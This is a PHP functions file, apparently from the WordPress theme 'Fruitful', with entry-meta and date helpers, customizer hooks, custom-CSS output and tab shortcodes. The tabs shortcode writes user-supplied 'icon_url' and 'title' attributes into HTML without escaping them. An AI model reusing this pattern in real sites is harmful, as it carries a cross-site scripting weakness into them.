
function get_custom_css() { 
	$theme_options  = ret_options("fruitful_theme_options"); 
	
	if (isset($theme_options['custom_css'])) {
		echo '<style type="text/css">';
			echo $theme_options['custom_css'];
		echo '</style>';
	}	
}

add_action('wp_head', 'get_custom_css');


function fruitful_entry_meta() { 
?>

	<span class="author-link"><a href="<?php print esc_url( get_author_posts_url( get_the_author_meta( 'ID' ))); ?>"><?php print get_the_author(); ?></a></span>
	<?php if ( 'post' == get_post_type() ) : // Hide category and tag text for pages on Search ?>
	<?php
		/* translators: used between list items, there is a space after the comma */
		 $categories_list = get_the_category_list( __( ', ', 'fruitful' ) );
	if ( $categories_list && fruitful_categorized_blog() ) : ?>
		<span class="cat-links">
			<?php printf( __( 'Posted in %1$s', 'fruitful' ), $categories_list ); ?>
		</span>
	<?php endif; // End if categories ?>

	<?php
		/* translators: used between list items, there is a space after the comma */
		$tags_list = get_the_tag_list( '', __( ', ', 'fruitful' ) );
		if ( $tags_list ) :
	?>
		<span class="tag-links">
			<?php printf( __( 'Tagged %1$s', 'fruitful' ), $tags_list ); ?>
		</span> 
		<?php endif; // End if $tags_list ?>
	<?php endif; // End if 'post' == get_post_type() ?>
	<?php edit_post_link( __( 'Edit', 'fruitful' ), '<span class="edit-link">', '</span>' ); ?>
<?php 
}


function fruitful_entry_date( $echo = true ) {
	if ( has_post_format( array( 'chat', 'status' ) ) )
		$format_prefix = _x( '%1$s on %2$s', '1: post format name. 2: date', 'fruitful' );
	else
		$format_prefix = '%2$s';

	$date = sprintf( '<span class="date"><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a></span>',
		esc_url( get_permalink() ),
		esc_attr( sprintf( __( 'Permalink to %s', 'fruitful' ), the_title_attribute( 'echo=0' ) ) ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( sprintf( $format_prefix, get_post_format_string( get_post_format() ), get_the_date() ) )
	);

	if ( $echo )
		echo $date;

	return $date;
}


function fruitful_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
}
add_action( 'customize_register', 'fruitful_customize_register' );

function fruitful_customize_preview_js() {
	wp_enqueue_script( 'fruitful-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20130226', true );
}
add_action( 'customize_preview_init', 'fruitful_customize_preview_js' );



function tabs_main($atts, $content = null) {
	$output = '';
	extract(shortcode_atts(array(
		'tab' => array('')
	), $atts));
	global $tab_counter_2;

	$tab_counter_1 = 1;
	$tab_counter_2 = 1;

	$output .= '<div class="tabbed-nav" id="tabbed-nav">';
		$output .= '<ul>';
	foreach ($atts as $tab) {
		$in_array = explode('&amp;', $tab);
		$result = array();
		foreach ($in_array as $chunk) {
				 $chunk = explode('=', $chunk);
				 $result[$chunk[0]] = $chunk[1];
		}
		if (isset($result['icon_url'])) {
			$output .= '<li><a><span><img src="'. $result['icon_url'] .'" alt="" /></span>' . $result['title'] . '</a></li>';
		} else {
			$output .= '<li><a>' . $result['title'] . '</a></li>';
		}		
		$tab_counter_1++;
	}
	$output .= '</ul>';
	$output .= '<div>';
		$output .= do_shortcode($content);
	$output .= '</div>';
	$output .='</div>';
	return $output;
	unset($tab_counter_2);
}
add_shortcode('tabs', 'tabs_main');

function tab_elements($atts, $content = null) {
	$output = '';
	extract(shortcode_atts(array(
    ), $atts));

	global $tab_counter_2;
	$output .= '<div>' . do_shortcode($content) . '</div>';
	$tab_counter_2++;
	return $output;
}
add_shortcode('tab', 'tab_elements');